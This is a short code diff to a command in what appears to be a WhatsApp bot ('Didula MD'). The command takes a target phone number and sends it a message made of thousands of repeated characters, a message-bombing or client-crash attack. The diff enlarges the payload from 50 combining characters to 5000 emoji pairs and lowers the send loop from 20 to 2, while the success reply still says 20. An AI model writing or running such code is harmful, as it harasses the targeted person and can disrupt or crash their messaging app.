@@ -40,11 +40,11 @@ cmd({
     const targetNumber = args[0];
     if (!targetNumber) return reply("❗ Please provide a target number.");
 
-    const message = `̿Didula MD` + "ꦾ".repeat(50);
+    const message = `̿Didula MD` + "🍌😹".repeat(5000);
     const fullMessage = message + "\n"; // Adding new line for better readability
 
     try {
-        for (let i = 0; i < 20; i++) {
+        for (let i = 0; i < 2; i++) {
             await conn.sendMessage(targetNumber + "@s.whatsapp.net", { text: fullMessage });
         }
         reply("✅ Message sent 20 times to " + targetNumber);
